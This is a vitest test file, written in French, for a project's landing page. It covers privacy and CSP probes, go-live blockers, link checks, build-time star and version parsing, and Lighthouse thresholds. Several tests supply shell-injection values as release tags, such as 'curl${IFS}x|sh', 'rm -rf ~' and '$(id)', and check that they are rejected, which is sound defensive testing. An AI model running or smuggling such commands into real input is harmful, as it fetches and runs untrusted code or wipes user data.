// SPDX-License-Identifier: AGPL-3.0-only
// Contrôles de la landing hors CI de PR (22 § 2.9, 22b § 5) : verdict de la sonde, bloquants du GO, liens externes, étoiles. Sans réseau.
import { describe, expect, test } from 'vitest';
import { loadClaims } from './claims.ts';
import { checkExternalLinks, evaluateProbes, goBlockers, isRealTestIn, lighthouseFailures, parseStars, parseStarsFile, probeReport } from './checks.ts';
import { startCommand } from './content.ts';
import type { PageProbe } from './probe.ts';

const clean: PageProbe = { url: 'https://x.example/sym/', requests: ['https://x.example/sym/'], thirdPartyRequests: [], trackerRequests: [], documentCookie: '', contextCookies: [], setCookieHeaders: [], storageWritesBeforeAction: [], storageAfterLoad: [], cspViolations: [], consoleErrors: [], cspMeta: "default-src 'none'; script-src 'self'", formCount: 0, html: '' };

describe('sonde de la landing : les cinq contrôles de la préproduction et de la production', () => {
  test('une page propre passe tout', () => {
    const checks = evaluateProbes([clean]);
    expect(checks.map((c) => c.name)).toEqual(['assert_landing_no_cookie', 'assert_landing_no_third_party_request', 'assert_landing_no_third_party_tracker', 'assert_landing_csp_strict', 'assert_landing_no_signup']);
    expect(checks.every((c) => c.ok)).toBe(true);
    expect(probeReport(clean.url, checks, new Date('2026-10-02T00:00:00Z'))).toMatchObject({ date: '2026-10-02T00:00:00.000Z', ok: true });
  });

  test('un cookie, une requête tierce, un traceur, une violation de CSP ou un formulaire font échouer le contrôle concerné', () => {
    const cases: [string, Partial<PageProbe>][] = [
      ['assert_landing_no_cookie', { documentCookie: 'a=1' }],
      ['assert_landing_no_cookie', { setCookieHeaders: ['x : __cf_bm=1'] }],
      ['assert_landing_no_cookie', { storageWritesBeforeAction: ['localStorage.setItem(k)'] }],
      ['assert_landing_no_cookie', { storageAfterLoad: ['localStorage.k'] }],
      ['assert_landing_no_cookie', { storageAfterLoad: ['indexedDB:db', 'caches:c', 'serviceWorker:https://x.example/sym/'] }],
      ['assert_landing_no_third_party_request', { thirdPartyRequests: ['https://cdn.example/a.js'] }],
      ['assert_landing_no_third_party_tracker', { trackerRequests: ['https://static.cloudflareinsights.com/beacon.min.js'] }],
      ['assert_landing_csp_strict', { cspViolations: ["style-src-attr : inline"] }],
      ['assert_landing_csp_strict', { cspMeta: null }],
      ['assert_landing_csp_strict', { cspMeta: "script-src 'unsafe-inline'" }],
      ['assert_landing_no_signup', { formCount: 1 }],
    ];
    for (const [name, patch] of cases) {
      const failed = evaluateProbes([{ ...clean, ...patch }]).filter((c) => !c.ok).map((c) => c.name);
      expect(failed, name).toEqual([name]);
    }
  });
});

describe('bloquants du GO de mise en ligne', () => {
  const loaded = loadClaims();
  /** Le registre tel qu'il sera au GO : chaque entrée relue par un humain. */
  const registry = { ...loaded, claims: loaded.claims.map((claim) => ({ ...claim, reviewer: 'human' as const })) };
  const base = { registry, displayed: ['license', 'hero.sub'], legalSources: [], isRealTest: () => true, version: '1.0.0' };

  test('tout est livré : aucun bloquant, mais la relecture humaine reste à faire', () => {
    const { blockers, manual } = goBlockers(base);
    expect(blockers).toEqual([]);
    expect(manual.join('\n')).toMatch(/relecture humaine/);
    expect(manual.join('\n')).toMatch(/2\.3, 2\.12/);
  });

  test('une preuve qui n\'est qu\'un test.todo bloque ; un champ juridique à fournir bloque ; l\'absence de version publiée bloque (la commande clonerait la branche par défaut, 22 § 2.3)', () => {
    const { blockers } = goBlockers({ ...base, isRealTest: (name) => name !== 'assert_step_patch_bounded', legalSources: [{ file: 'notice.md', text: 'a [À compléter avant la mise en ligne : nom] b' }], version: null });
    expect(blockers.join('\n')).toMatch(/assert_step_patch_bounded n'est pas encore un vrai test/);
    expect(blockers.join('\n')).toMatch(/champ à fournir/);
    expect(blockers.join('\n')).toMatch(/aucune version publiée/);
  });

  test('une entrée à relire ou bloquée affichée bloque', () => {
    const { blockers } = goBlockers({ ...base, displayed: ['responsible.user-agent', 'absente'] });
    expect(blockers.join('\n')).toMatch(/statut « bloqué »/);
    expect(blockers.join('\n')).toMatch(/absente du registre/);
  });

  test('assert_landing_claims_sourced : une entrée affichée relue par l\'agent seulement (pas par un humain) bloque le GO', () => {
    expect(loaded.claims.every((claim) => claim.reviewer === 'agent' || claim.reviewer === 'human')).toBe(true);
    const { blockers } = goBlockers({ ...base, registry: loaded });
    expect(blockers.join('\n')).toMatch(/« license » .*relue par un humain/);
    expect(blockers.join('\n')).toMatch(/« hero\.sub » .*relue par un humain/);
  });

  test('décisions et preuves qui restent à confirmer par un humain : langue de référence des pages juridiques, résultat daté de la production cité par #preuves', () => {
    const { manual } = goBlockers(base);
    expect(manual.join('\n')).toMatch(/langue de référence des pages juridiques/);
    expect(manual.join('\n')).toMatch(/#preuves/);
  });

  test('un test est « réel » s\'il figure dans un fichier de test sans y être seulement en test.todo', () => {
    expect(isRealTestIn([{ file: 'a', text: 'test.todo("assert_x")' }], 'assert_x')).toBe(false);
    expect(isRealTestIn([{ file: 'a', text: 'rien' }], 'assert_x')).toBe(false);
    expect(isRealTestIn([{ file: 'b', text: "describe('assert_x : ...', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "test.describe('assert_x', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "test.concurrent('assert_x', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "it.each([1, 2])('assert_x %s', () => {})" }], 'assert_x')).toBe(true);
    expect(isRealTestIn([{ file: 'b', text: "describe('assert_x_suite', () => {})" }], 'assert_x'), 'un autre nom qui commence pareil').toBe(false);
    // Une chaîne qui ressemble à un commentaire (motif, adresse) ne masque pas les déclarations qui suivent.
    expect(isRealTestIn([{ file: 'b', text: "const glob = 'apps/**/*.ts';\nconst url = `https://x.example/${'a'}`;\ndescribe('assert_x', () => {});\n// */" }], 'assert_x')).toBe(true);
  });

  test('assert_landing_claims_sourced (porte du GO) : un test sauté, conditionnel, attendu en échec, commenté ou encore en test.todo partiel n\'est pas une preuve livrée', () => {
    for (const text of [
      "test.skip('assert_x', () => {})",
      "describe.skip('assert_x', () => {})",
      "test.skipIf(true)('assert_x', () => {})",
      "describe.skipIf(ci)('assert_x', () => {})",
      "test.runIf(false)('assert_x', () => {})",
      "test.fails('assert_x', () => {})",
      "test.fixme('assert_x', () => {})",
      "test.describe.skip('assert_x', () => {})",
      "xit('assert_x', () => {})",
      "xdescribe('assert_x', () => {})",
      "xtest('assert_x', () => {})",
      "// test('assert_x', () => {})",
      "/* describe('assert_x', () => {}) */",
      "/**\n * test('assert_x')\n */",
    ]) expect(isRealTestIn([{ file: 'a', text }], 'assert_x'), text).toBe(false);
    // Un groupe livré à côté d'un volet encore en test.todo (même règle que stillTodo de tests/docs-guards.unit.test.ts) : pas livré.
    const partial = [{ file: 'a.test.ts', text: "describe('assert_x : volet serveur', () => {})" }, { file: 'tests/invariants.todo.test.ts', text: 'test.todo("assert_x — volet tunnel");' }];
    expect(isRealTestIn(partial, 'assert_x')).toBe(false);
    expect(isRealTestIn([...partial.slice(0, 1), { file: 'tests/invariants.todo.test.ts', text: 'test.todo("assert_y — autre");' }], 'assert_x')).toBe(true);
  });
});

describe('assert_landing_links_resolve (externes) : 200 hors exceptions documentées', () => {
  test('HEAD puis GET ; une erreur réseau ou un code autre que 200 est rapporté ; une exception est ignorée', async () => {
    const answers: Record<string, number> = { 'https://github.com/a': 200, 'https://github.com/b': 404, 'https://render.com/c': 405 };
    const calls: string[] = [];
    const fetchStatus = async (url: string, method: 'HEAD' | 'GET'): Promise<number> => {
      calls.push(`${method} ${url}`);
      if (url === 'https://boom.example/') throw new Error('ECONNREFUSED');
      if (url === 'https://render.com/c') return method === 'HEAD' ? 405 : 200;
      return answers[url] ?? 500;
    };
    const failures = await checkExternalLinks(['https://github.com/a', 'https://github.com/b', 'https://render.com/c', 'https://boom.example/', 'https://skip.example/x', 'https://github.com/a'], fetchStatus, new Set(['skip.example']));
    expect(failures).toEqual([{ url: 'https://boom.example/', status: 'ECONNREFUSED' }, { url: 'https://github.com/b', status: 404 }]);
    expect(calls).toContain('GET https://render.com/c');
    expect(calls.filter((call) => call.includes('https://github.com/a'))).toHaveLength(1);
  });
});

describe('étoiles et version écrites au build', () => {
  const previous = { stars: 120, version: '0.1.0', updatedAt: '2026-10-01T00:00:00.000Z' };
  test('lues dans les réponses de l\'API ; la valeur précédente est gardée si une réponse est inexploitable', () => {
    const now = new Date('2026-10-02T00:00:00Z');
    expect(parseStars(previous, { stargazers_count: 150 }, { tag_name: 'v0.2.0' }, now)).toEqual({ stars: 150, version: '0.2.0', updatedAt: now.toISOString() });
    expect(parseStars(previous, { message: 'rate limited' }, null, now)).toEqual(previous);
    expect(parseStars(previous, { stargazers_count: 120 }, { tag_name: 'nightly' }, now)).toEqual(previous);
    expect(parseStars(previous, { stargazers_count: 120 }, { tag_name: 'v0.3.0-beta.2' }, now)).toEqual({ stars: 120, version: '0.3.0-beta.2', updatedAt: now.toISOString() });
  });

  test('assert_landing_stars_build_time : un tag de release piégé (nom de référence git valide mais commande shell) n\'entre jamais dans la commande à copier', () => {
    const now = new Date('2026-10-02T00:00:00Z');
    for (const tag of ['v1.0.0;curl${IFS}x|sh', 'v1.0.0 && rm -rf ~', 'v1.0.0$(id)', 'v1.0.0`id`', '1.0.0\nwhoami', 'v1.0.0-beta.1;sh']) {
      expect(parseStars(previous, { stargazers_count: 150 }, { tag_name: tag }, now).version, tag).toBe('0.1.0');
    }
  });

  test('assert_landing_stars_build_time : landing/stars.json est validé à la lecture ; un fichier altéré fait échouer le build', () => {
    expect(parseStarsFile({ stars: 0, version: null, updatedAt: null })).toEqual({ stars: 0, version: null, updatedAt: null });
    expect(parseStarsFile({ stars: 140, version: '1.2.3', updatedAt: '2026-10-02T00:00:00.000Z' })).toEqual({ stars: 140, version: '1.2.3', updatedAt: '2026-10-02T00:00:00.000Z' });
    for (const bad of [null, [], { stars: -1, version: null, updatedAt: null }, { stars: 1.5, version: null, updatedAt: null }, { stars: '100', version: null, updatedAt: null }, { stars: 1, version: '1.0.0;curl${IFS}x|sh', updatedAt: null }, { stars: 1, version: 'v1.0.0', updatedAt: null }, { stars: 1, version: 2, updatedAt: null }, { stars: 1, version: null, updatedAt: 3 }]) {
      expect(() => parseStarsFile(bad), JSON.stringify(bad)).toThrow(/landing\/stars\.json/);
    }
  });

  test('assert_landing_stars_build_time : la commande de démarrage revérifie la version (seconde ligne de défense)', () => {
    const inputs = { registry: loadClaims(), repository: 'scrap-yo-mama/sym', stars: 0, quickstart: { secrets: 'echo secrets', start: 'docker compose up -d' }, compare: false };
    expect(startCommand({ ...inputs, version: '1.2.3' }).split('\n')[0]).toBe('git clone --branch v1.2.3 --depth 1 https://github.com/scrap-yo-mama/sym.git');
    expect(() => startCommand({ ...inputs, version: '1.0.0;curl${IFS}x|sh' })).toThrow(/version/);
  });
});

describe('assert_landing_perf_budget (Lighthouse mobile) : verdict des scores', () => {
  const thresholds = { performance: 95, accessibility: 95, seo: 95 };
  test('chaque catégorie au seuil ou au-dessus passe ; en dessous, absente ou non notée, elle échoue', () => {
    expect(lighthouseFailures({ performance: { score: 0.95 }, accessibility: { score: 1 }, seo: { score: 0.98 } }, thresholds)).toEqual([]);
    expect(lighthouseFailures({ performance: { score: 0.94 }, accessibility: { score: null }, seo: undefined }, thresholds)).toEqual(['performance : 94 < 95', 'accessibility : non noté', 'seo : non noté']);
  });
});
